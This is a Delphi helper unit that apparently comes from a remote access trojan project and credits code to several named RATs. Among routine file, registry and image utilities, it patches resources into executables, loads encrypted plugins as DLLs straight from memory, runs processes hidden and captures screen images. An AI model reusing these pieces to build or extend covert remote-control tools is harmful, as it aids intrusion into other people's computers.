unit UnitFunctions;

interface

uses
  Windows, SysUtils, StrUtils, ShellAPI, WinSock, ComCtrls, Classes, Graphics,
  IdHTTP, ShlObj, Math, ClassesMOD, ActiveX, GDIPAPI, GDIPOBJ, GDIPUTIL,
  BTMemoryModule, UnitVariables, UnitConstants, UnitEncryption, MD5;

const
  MAXSTRINGCOUNT = 1000;

type
  TStringArray = array[0..MAXSTRINGCOUNT] of string;
  TByteArray = array of Byte;
   
type
  PLogDatas = ^TLogDatas;
  TLogDatas = record
    Action, Log: string;
    i: Integer;
    lColor: TColor;
  end;

function JustL(S: string; Size: integer) : string;
function FileSizeToStr(Bytes: Int64): string;
function FileIconInit(FullInit: BOOL): BOOL; stdcall;
function GetImageIndex(FileName: string): integer;
procedure SetClipboardText(Const S: widestring);
function TmpDir: string;
function ReadKeyString(Key:HKEY; Path:string; Value, Default: string): string;
procedure CreateKeyString(Key: HKEY; Subkey, Name, Value: string);
function MyGetFileSize(Filename: string): Int64;
function MyGetTime(S: string): string;
function MyGetDate(S: string): string;
function _MyGetTime(S: string): string;
procedure MyCreateFile(Filename, Buffer: string; BufferSize: Cardinal);
function FileToStr(Filename: string): string;
function WriteResData(Filename: string; pFile: pointer; Size: Integer; Name: string): Boolean;
function GetResourceAsString(pSectionName: pchar): string;
function RandomString(Count: Integer = 10): string;
function MyStartThread(F: Pointer; p: Pointer = nil): Cardinal;
function MyBoolToStr(TmpBool: Boolean): string;
function MyStrToBool(TmpStr: string): Boolean;
function ParseString(Delim, Str: string): TStringArray;
function StringCount(Delim, Str: string): Integer;
function GetNodeRoot(Node: TTreeNode): string;
function MyShellExecute(Hwnd: HWND; FileName, Parameters: string; ShowCmd: Integer): Cardinal;
function WanAddress: string;
function FindNode(Text: string; tv: TTreeView; Node: TTreeNode): TTreeNode;
function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
function ProgramFilesDir: string;
function ByteArrayToStr(BA: PByteArray): string;
function StrToByteArray(Str: string): TByteArray;
procedure ExecAndWait(FileName: string; ShowCmd: Integer = SW_HIDE);
function MyReplaceStr(const Str, OldStr, NewStr: string; ReplaceAll: Boolean = True): string;
function XorEnDecrypt(Str: string): string;
function LocalAddress: string;
function GetImageFromBMP(BmpFile: TBitmap; Quality, X, Y: Integer): string;
function GetAnyImageToStream(FileName: string; Quality, x, y: integer): string;
procedure ListFiles(StartDir, FileMask: string; var FilesList: TStringList);
function MSecToTime(mSec: Int64): string;
function CheckValidName(Name: string; Extra: string = ''): Boolean;
function GetDriveString(DriveType: Integer): string;
procedure ExecutePlugin(lv: TListView; PluginId: string; Socket: Integer = -1; Datas: string = '');
function MyDeleteResources(Filename: string): Boolean;
function FileSizeToBytes(fs: string): Int64;
function GetMD5(Filename: string): string;

implementation

function GetMD5(Filename: string): string;
var
  Digest: MD5Digest;
begin
  Digest := MD5File(Filename);
  Result := MD5Print(Digest);
end;

function MyDeleteResources(Filename: string): Boolean;
var
  TmpBool, TmpBool1: Boolean;
  h: THandle;
begin
  Result := False;

  h := BeginUpdateResource(PChar(Filename), False);
  if h = 0 then Exit;

  TmpBool := UpdateResource(h, RT_RCDATA, 'DVCLAL', LANG_NEUTRAL, nil, 0);
  TmpBool1 := UpdateResource(h, RT_RCDATA, 'PACKAGEINFO', LANG_NEUTRAL, nil, 0);
  if (not TmpBool) and (not TmpBool1) then EndUpdateResource(h, True) else
    EndUpdateResource(h, False);

  Result := (TmpBool) and (TmpBool1);
end;

function GetDriveString(DriveType: Integer): string;
begin
  case DriveType of
    DRIVE_UNKNOWN: Result := 'Unknow';
    DRIVE_REMOVABLE: Result := 'Removable';
    DRIVE_FIXED: Result := 'Fixed';
    DRIVE_REMOTE: Result := 'Remote';
    DRIVE_CDROM: Result := 'CDROM';
    DRIVE_RAMDISK: Result := 'Ram disk';
  end;
end;

function CheckValidName(Name: string; Extra: string): Boolean;
begin
  Result := False;
  
  if (Pos('|', Name) <= 0) or (Pos('*', Name) <= 0) or (Pos('\', Name) <= 0) or
    (Pos('/', Name) <= 0) or (Pos(':', Name) <= 0) or (Pos('?', Name) <= 0) or
    (Pos('"', Name) <= 0) or (Pos('<', Name) <= 0) or (Pos('>', Name) <= 0)
  then Result := True;
  
  if Extra <> '' then Result := Pos(Extra, Name) <= 0;
end;

//From AeroRAT source code
function MSecToTime(mSec: Int64): string;
const
  ticksperday: Integer = 1000 * 60 * 60 * 24;
  ticksperhour: Integer = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;

  function _Format(const aNumber, Length : integer) : string;
  begin
    Result := SysUtils.Format('%.*d', [Length, aNumber]) ;
  end;
var
  t: int64;
  h, m, s: Integer;
begin
  t := mSec;
  h := t div ticksperhour;
  Dec(t, h * ticksperhour);
  m := t div ticksperminute;
  Dec(t, m * ticksperminute);
  s := t div tickspersecond;
  Result := _Format(h, 2) + 'h ' + _Format(m, 2) + 'm ' + _Format(s, 2) + 's';
end;

procedure ListFiles(StartDir, FileMask: string; var FilesList: TStringList);
var
  sRec: TSearchRec;
  DirList: TStringList;
  IsFound: Boolean;
  i: integer;
begin
  if StartDir[length(StartDir)] <> '\' then StartDir := StartDir + '\';
  IsFound := FindFirst(StartDir + FileMask, faAnyFile - faDirectory, sRec) = 0;

  while IsFound do
  begin
    FilesList.Add(StartDir + sRec.Name);        
    IsFound := FindNext(sRec) = 0;
  end;

  FindClose(sRec);
  DirList := TStringList.Create;

  try
    IsFound := FindFirst(StartDir + '*.*', faAnyFile, sRec) = 0;
    while IsFound do
    begin
      if ((sRec.Attr and faDirectory) <> 0) and (sRec.Name[1] <> '.') then
        DirList.Add(StartDir + sRec.Name);
      IsFound := FindNext(sRec) = 0;
    end;
    FindClose(sRec);
    for i := 0 to DirList.Count - 1 do ListFiles(DirList[i], FileMask, FilesList);
  finally
    DirList.Free;
  end;
end;

type
  TResizeMode = (rmDefault, rmNearest, rmBilinear, rmBicubic);

function ResizeImage(var bmp: TGPBitmap; width, Height: integer; mode: TResizeMode): Boolean;
var
  gr: TGPGraphics;
  buf: TGPBitmap;
begin
  buf := TGPBitmap.Create(Width, Height, bmp.GetPixelFormat);
  gr := TGPGraphics.Create(buf);
  case mode of
    rmDefault: ;
    rmNearest:  gr.SetInterpolationMode(InterpolationModeNearestNeighbor);
    rmBilinear: gr.SetInterpolationMode(InterpolationModeHighQualityBilinear);
    rmBicubic:  gr.SetInterpolationMode(InterpolationModeHighQualityBicubic);
  end;
  
  result := gr.DrawImage(bmp, 0, 0, Width, Height) = Ok;
  gr.Free;
  bmp.Free;
  bmp := buf;
end;

procedure SaveAndScaleScreen(quality, x, y: integer; Result: TMemoryStream;
  var StreamToSave: TMemoryStream);
var
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;
  Image: TGPBitmap;
  xIs: IStream;
  yIs: IStream;
begin
  yIS := TStreamAdapter.Create(Result, soReference);
  Image := TGPBitmap.Create(yIs);

  if (x <> 0) and (y <> 0) then ResizeImage(Image, x, y, rmDefault);
  GetEncoderClsid('image/jpeg', encoderClsid);
  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  StreamToSave.Clear;
  StreamToSave.Position := 0;

  xIS := TStreamAdapter.Create(StreamToSave, soReference);
  image.Save(xIS, encoderClsid, @encoderParameters);
  image.Free;
end;

procedure TakeCapture(Quality, x, y: integer; Result: TMemoryStream;
  var ResultStream: TMemoryStream);
begin
  Result.Position := 0;
  ResultStream.Position := 0;
  SaveAndScaleScreen(Quality, x, y, Result, ResultStream);
  ResultStream.Position := 0;
end;

procedure ConvertImageToResult(OriginalFile: string; var Result: TMemoryStream);
var
  encoderClsid: TGUID;
  transformation: TEncoderValue;
  Image: TGPBitmap;
  xIs: IStream;
begin
  Image := TGPBitmap.Create(pchar(OriginalFile));
  GetEncoderClsid('image/bmp', encoderClsid);
  xIS := TStreamAdapter.Create(Result, soReference);
  image.Save(xIS, encoderClsid);
  image.Free;
end;

function GetAnyImageToStream(FileName: string; Quality, x, y: integer): string;
var
  Stream, TmpStream: TMemoryStream;
begin
  Stream := TMemoryStream.Create;
  ConvertImageToResult(FileName, Stream);
  Stream.Position := 0;
  TmpStream := TMemoryStream.Create;
  TakeCapture(Quality, x, y, Stream, TmpStream);
  Stream.Free;  
  SetLength(Result, TmpStream.Size);
  TmpStream.Read(Pointer(Result)^, Length(Result));
  TmpStream.Free;
end;

function GetImageFromBMP(BmpFile: TBitmap; Quality, X, Y: Integer): string;
var
  ImageBMP: TGPBitmap;
  Palette: HPALETTE;
  encoderClsid: TGUID;
  encoderParameters: TEncoderParameters;            
  transformation: TEncoderValue;
  xIs: IStream;
  BmpStream: TMemoryStream;
begin
  ImageBMP := TGPBitmap.Create(BmpFile.Handle, Palette);
  if (x <> 0) and (y <> 0) then ResizeImage(ImageBMP, x, y, rmDefault);

  GetEncoderClsid('image/jpeg', encoderClsid);
  encoderParameters.Count := 1;
  encoderParameters.Parameter[0].Guid := EncoderQuality;
  encoderParameters.Parameter[0].Type_ := EncoderParameterValueTypeLong;
  encoderParameters.Parameter[0].NumberOfValues := 1;
  encoderParameters.Parameter[0].Value := @quality;

  BmpStream := TMemoryStream.Create;
  xIS := TStreamAdapter.Create(BmpStream, soReference);
  ImageBMP.Save(xIS, encoderClsid, @encoderParameters);
  ImageBMP.Free;
  BmpStream.Position := 0;
  SetLength(Result, BmpStream.Size);
  BmpStream.Read(Pointer(Result)^, Length(Result));
  BmpStream.Free;
end;

function XorEnDecrypt(Str: string): string;  //Simple Xor encryption
var
  i, c, x: Integer;
begin
  for i := 1 to Length(Str) do
  begin
    c := Integer(Str[i]);
    x := c xor 50;
    Result := Result + Char(x);
  end;
end;

function MyReplaceStr(const Str, OldStr, NewStr: string; ReplaceAll: Boolean = True): string;
var
  i: Integer;
  TmpStr, S: string;
  oStr, nStr: string;
begin
  S := Str;
  Result := S;
  oStr := OldStr;
  nStr := NewStr;
  TmpStr := '';
  if Pos(OldStr, S) <= 0 then Exit;

  if not ReplaceAll then
  begin
    i := Pos(oStr, S);
    TmpStr := TmpStr + Copy(S, 1, i - 1);
    TmpStr := TmpStr + nStr;
    S := Copy(S, i + Length(oStr), Length(S));
    TmpStr := TmpStr + S; 
  end
  else
  begin
    repeat
      i := Pos(oStr, S);
      if i > 0 then
      begin
        TmpStr := TmpStr + Copy(S, 1, i - 1);
        TmpStr := TmpStr + nStr;
        S := Copy(S, i + Length(oStr), Length(S));
      end
      else TmpStr := TmpStr + S;
    until i = 0;
  end;

  Result := TmpStr;
end;

procedure ExecAndWait(FileName: string; ShowCmd: Integer); //by wrh1d3
var
  SI: TStartupInfo;
  PI: TProcessInformation;
begin
  FillChar(SI, SizeOf(SI), #0);
  SI.cb := SizeOf(SI);
  SI.dwFlags := STARTF_USESHOWWINDOW or STARTF_FORCEONFEEDBACK;
  SI.wShowWindow := ShowCmd;
  if CreateProcess(nil, @Filename[1], nil, nil, False, $00000010 or $00000020, nil, nil, SI, PI) then
  begin
    WaitForSingleObject(PI.hProcess, INFINITE);
    if PI.hProcess <> 0 then CloseHandle(PI.hProcess);
    if PI.hThread <> 0 then CloseHandle(PI.hThread);
  end;
end;

function StrToByteArray(Str: string): TByteArray;
begin
  SetLength(Result, Length(Str));
  CopyMemory(@Result[0], @Str[1], Length(Str));
end;

function ByteArrayToStr(BA: PByteArray): string;
begin
  SetLength(Result, SizeOf(BA));
  CopyMemory(@Result[1], @BA[0], SizeOf(BA));
end;

function ProgramFilesDir: string;
var
  RecPath: array[0..255] of char;
begin
  Result := '';
  if SHGetSpecialFolderPath(0, RecPath, $0026, false) then
    Result := IncludeTrailingBackslash(RecPath);
end;

function DeleteAllFilesAndDir(FilesOrDir: string): Boolean;
var
  F: TSHFileOpStruct;
  From: string;
  Resultval: integer;
begin
  FillChar(F, SizeOf(F), #0);
  From := FilesOrDir + #0;
  try
    F.wnd := 0;
    F.wFunc := FO_DELETE;
    F.pFrom := PChar(From);
    F.pTo := nil;
    F.fFlags := F.fFlags or FOF_NOCONFIRMATION or FOF_SIMPLEPROGRESS or FOF_FILESONLY or FOF_NOERRORUI;
    F.fAnyOperationsAborted := False;
    F.hNameMappings := nil;
    Resultval := ShFileOperation(F);
    Result := (ResultVal = 0);
  finally
  end;
end;

function FindNode(Text: string; tv: TTreeView; Node: TTreeNode): TTreeNode;
var
  i: Integer;
begin
  Result := nil;
  if Node = nil then
  begin
    for i := 0 to tv.Items[0].Count - 1 do
    if UpperCase(tv.Items[0].Item[i].Text) = UpperCase(Text) then
    Result := tv.Items[0].Item[i];
  end
  else
  begin
    for i := 0 to Node.Count - 1 do
    if UpperCase(Node.Item[i].Text) = UpperCase(Text) then
    Result := Node.Item[i];
  end;
end;

//From stackoverflow.net
function WanAddress: string;
var
  http: TIdHTTP;
begin
  try
    http := TIdHTTP.Create(nil);
    Result := http.Get('http://ipinfo.io/ip');
    http.Free;
  except
    Result := '127.0.0.1';
  end;
end;

function MyShellExecute(Hwnd: HWND; FileName, Parameters: string; ShowCmd: Integer): Cardinal;
begin
  Result := ShellExecute(Hwnd, 'open', PChar(FileName), PChar(Parameters), nil, ShowCmd);
end;

//From Coolvibes
function GetNodeRoot(Node: TTreeNode): string;
begin
  repeat
    Result := Node.Text + '\' + Result;
    Node := Node.Parent;
  until not Assigned(Node)
end;

//From XtremeRAT
function StringCount(Delim, Str: string): Integer;
var
  _Str: string;
begin
  Result := 0;
  _Str := Str;

  while Pos(Delim, _Str) > 0 do
  begin
    Inc(Result);
    Delete(_Str, 1, Pos(Delim, _Str));
  end;
end;

function ParseString(Delim, Str: string): TStringArray;
var
  Count: Integer;
begin
  Count := 0;
  if Pos(Delim, Str) <= 0 then Exit;

  while (Str <> '') and (Count <= MAXSTRINGCOUNT) do
  begin
    Result[Count] := Copy(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Pos(Delim, Str) - 1);
    Delete(Str, 1, Length(Delim));
    Inc(Count);
  end;
end;

function MyBoolToStr(TmpBool: Boolean): string;
begin
  if TmpBool = True then Result := 'Yes' else Result := 'No';
end;

function MyStrToBool(TmpStr: string): Boolean;
begin
  if TmpStr = 'Yes' then Result := True else Result := False;
end;

function MyStartThread(F: Pointer; p: Pointer): Cardinal;
var
  hThread: THandle;
begin
  Result := CreateThread(nil, 0, F, p, 0, hThread);
end;

function RandomString(Count: Integer): string;
const
  TmpStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';
var
  i: Integer;
begin
  Randomize;
  for i := 0 to Count do Result := Result + TmpStr[Random(Length(TmpStr)) + 1];
end;

function LocalAddress: string;
type
  TaPInAddr = array [0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  Buffer: pAnsiChar;
  I: Integer;
  GInitData: TWSADATA;
begin
  WSAStartup($101, GInitData);
  Result := '';
  GetMem(Buffer, 64);
  GetHostName(Buffer, 64);
  phe := GetHostByName(buffer);
  if phe = nil then Exit;
  pptr := PaPInAddr(Phe^.h_addr_list);
  I := 0;
  while pptr^[I] <> nil do
  begin
    result := inet_ntoa(pptr^[I]^);
    result := inet_ntoa(pptr^[I]^);
    Inc(I);
  end;
  FreeMem(Buffer, 64);
  WSACleanup;
end;

//p0ke mods by cswi
function GetResources(pSectionName: PChar; out ResourceSize: LongWord): Pointer;
var
  ResourceLocation: Cardinal;
  ResourceHandle: Cardinal;
begin
  ResourceLocation := FindResourceA(hInstance, PAnsiChar(pSectionName), PAnsiChar(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);   
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
end;

//p0ke mods by cswi
function GetResourceAsString(pSectionName: pchar): string;
var
  ResourceData: PChar;
  SResourceSize: LongWord;
begin
  ResourceData := GetResources(pSectionName, SResourceSize);
  SetString(Result, ResourceData, SResourceSize);
end;

//P0ke
function WriteResData(Filename: string; pFile: pointer; Size: Integer; Name: String): Boolean;
var
  hResourceHandle: THandle;
  pwServerFile: PWideChar;
  pwName: PWideChar;
begin
  GetMem(pwServerFile, (Length(Filename) + 1) * 2);
  GetMem(pwName, (Length(Name) + 1) *2);
  try
    StringToWideChar(Filename, pwServerFile, Length(Filename) * 2);
    StringToWideChar(Name, pwName, Length(Name) * 2);
    hResourceHandle := BeginUpdateResourceW(pwServerFile, False);
    Result := UpdateResourceW(hResourceHandle, MakeIntResourceW(10), pwName, 0, pFile, Size);
    EndUpdateResourceW(hResourceHandle, False);
  finally
    FreeMem(pwServerFile);
    FreeMem(pwName);
  end;
end;

function FileToStr(Filename: string): string;
var
  hFile: THandle;
  dSize, dRead: DWORD;
begin
  Result := '';
  hFile := CreateFile(PChar(Filename), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile = 0 then Exit;
  dSize := GetFileSize(hFile, nil);
  if dSize = 0 then Exit;
  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  SetLength(Result, dSize);
  ReadFile(hFile, Result[1], dSize, dRead, nil);
  CloseHandle(hFile);
end;

procedure MyCreateFile(Filename, Buffer: string; BufferSize: Cardinal);
var
  hFile, i: Cardinal;
begin
  if not FileExists(Filename) then
  begin
    hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
    if hFile = INVALID_HANDLE_VALUE then Exit;
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
  end
  else
  begin
    hFile := CreateFile(PChar(Filename), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_ALWAYS, 0, 0);
    if hFile = INVALID_HANDLE_VALUE then Exit;
    SetFilePointer(hFile, 0, nil, FILE_END);
  end;
  
  WriteFile(hFile, Buffer[1], BufferSize, i, nil);
  CloseHandle(hFile);
end;

function MyGetTime(S: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + S + inttostr(MyTime.wMinute) + S + inttostr(MyTime.wSecond);
end;
     
function _MyGetTime(S: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + S + inttostr(MyTime.wMinute) + S + inttostr(MyTime.wSecond) +
   S + IntToStr(MyTime.wMilliseconds);
end;

function MyGetDate(S: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wDay) + S + inttostr(MyTime.wMonth) + S + inttostr(MyTime.wYear);
end;

function MyGetFileSize(Filename: string): Int64;
var
  hFile: THandle;
begin
  hFile := CreateFile(PChar(Filename), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  Result := GetFileSize(hFile, nil);
  CloseHandle(hFile);
end;

procedure CreateKeyString(Key: HKEY; Subkey, Name, Value: string);
var
  regkey: Hkey;
begin
  RegCreateKey(Key, PChar(subkey), regkey);
  RegSetValueEx(regkey, PChar(name), 0, REG_EXPAND_SZ, PChar(value), Length(value));
  RegCloseKey(regkey);
end;

function ReadKeyString(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType:integer;
  DataSize:integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Handle);
  end;
end;

function TmpDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then Result := Result + '\';
  end;
end;

procedure SetClipboardText(Const S: widestring);
var
  Data: THandle;
  DataPtr: Pointer;
  Size: integer;
begin
  Size := length(S);
  OpenClipboard(0);
  try
    Data := GlobalAlloc(GMEM_MOVEABLE + GMEM_DDESHARE, (Size * 2) + 2);
    try
      DataPtr := GlobalLock(Data);
      try
        Move(S[1], DataPtr^, Size * 2);
        SetClipboardData(CF_UNICODETEXT{CF_TEXT}, Data);
      finally
        GlobalUnlock(Data);
      end;
    except
      GlobalFree(Data);
      raise;
    end;
  finally
    CloseClipboard;
  end;
end;

function GetImageIndex(FileName: string): Integer;
var
  SHFileInfo: TSHFileInfo;
begin
  Result := 0;
  try
    SHGetFileInfo(PChar(FileName), FILE_ATTRIBUTE_NORMAL, SHFileInfo,
      SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);
    Result := SHFileInfo.iIcon;
  finally
    if Result <= 0 then Result := 0;
  end;
end;

function FileIconInit(FullInit: BOOL): BOOL; stdcall;
type
  TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
var
  PFileIconInit: TFileIconInit;
  ShellDLL: integer;
begin
  //this forces winNT to load all the icons

  Result := False;
  if (Win32Platform = VER_PLATFORM_WIN32_NT) then
  begin
    ShellDLL := LoadLibrary('Shell32.dll');
    PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
    if (Assigned(PFileIconInit)) then Result := PFileIconInit(FullInit);
  end;
end;

//From SpyNet
function JustL(S: string; Size: integer) : string;
var
  i : integer;
begin
  i := Size - Length(S);
  if i > 0 then S := S + DupeString('.', i);
  JustL := S;
end;

//From ShwarzeSonne RAT
function FileSizeToStr(Bytes: Int64): string;
var
  dB, dKB, dMB, dGB, dT: integer;
begin
  Result := '0 Byte';
  if Bytes <= 0 then Exit;

  dB := Bytes;
  dKB := 0;
  dMB := 0;
  dGB := 0;
  dT  := 0;

  while (dB > 1024) do
  begin
    inc(dKB, 1);
    dec(dB , 1024);
    dT := 1;
  end;

  while (dKB > 1024) do
  begin
    inc(dMB, 1);
    dec(dKB, 1024);
    dT := 2;
  end;

  while (dMB > 1024) do
  begin
    inc(dGB, 1);
    dec(dMB, 1024);
    dT := 3;
  end;

  case dT of
    0: Result := IntToStr(dB) + ' Bytes';
    1: Result := inttostr(dKB) + '.' + copy(inttostr(dB ), 1, 2) + ' KB';
    2: Result := inttostr(dMB) + '.' + copy(inttostr(dKB), 1, 2) + ' MB';
    3: Result := inttostr(dGB) + '.' + copy(inttostr(dMB), 1, 2) + ' GB';
  end;
end;

function FileSizeToBytes(fs: string): Int64;
var
  TmpStr: string;
begin
  if (Pos('Bytes', fs) > 0) or (Pos('Byte', fs) > 0) then
    Result := StrToInt(Copy(fs, 1, Pos(' ', fs) - 1))
  else

  if Pos('KB', fs) > 0 then
  begin
    TmpStr := Copy(fs, 1, Pos(' ', fs) - 1);
    Result := Round(StrToFloat(TmpStr) * 1024);
  end
  else

  if Pos('MB', fs) > 0 then
  begin
    TmpStr := Copy(fs, 1, Pos(' ', fs) - 1);
    Result := Round(StrToFloat(TmpStr) * Sqr(1024));
  end
  else

  if Pos('GB', fs) > 0 then
  begin
    TmpStr := Copy(fs, 1, Pos(' ', fs) - 1);
    Result := Round(StrToFloat(TmpStr) * Sqr(1024) * 1024);
  end;
end;
  
procedure ExecutePlugin(lv: TListView; PluginId: string; Socket: Integer; Datas: string);
var
  SchRec: TSearchRec;
  Buffer, TmpStr: string;
  Module: PBTMemoryModule;
  p: Pointer;                  
  PluginFunction: procedure();
  PluginFeedBack: procedure(_FeedBack: PChar); stdcall;
  PluginOptions: procedure(_Socket: Integer); stdcall;
  BufferSize: Int64;
  TmpList: TStringArray;
  i: Integer;
  Filename: string;
begin
  if not DirectoryExists(PluginsPath) then Exit;

  for i := 0 to lv.Items.Count - 1 do
  begin
    if PluginId <> lv.Items.Item[i].SubItems[4] then  Continue;
    Filename := lv.Items.Item[i].Caption;
    Break;
  end;

  if FindFirst(PluginsPath + '\*.plugin', faAnyFile, SchRec) <> 0 then Exit;
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;
    if PluginsPath + '\' + SchRec.Name <> Filename then Continue;

    Buffer := FileToStr(Filename);
    BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
    Delete(Buffer, 1, Pos('|', Buffer));
    Delete(Buffer, 1, BufferSize);
    Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);

    if Buffer = '' then Continue;
    p := @Buffer[1];

    try
      Module := BTMemoryLoadLibary(p, Length(Buffer));
      if Module = nil then Continue;

      if Datas <> '' then
      begin
        @PluginFeedBack := BTMemoryGetProcAddress(Module, 'PluginFeedBack');
        if Assigned(PluginFeedBack) then PluginFeedBack(PChar(Datas));
      end
      else
      begin
        @PluginOptions := BTMemoryGetProcAddress(Module, 'PluginOptions');
        if Assigned(PluginOptions) then PluginOptions(Socket);

        @PluginFunction := BTMemoryGetProcAddress(Module, 'PluginFunction');
        if Assigned(PluginFunction) then PluginFunction;
      end;
    finally
      BTMemoryFreeLibrary(Module);
    end;
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

end.
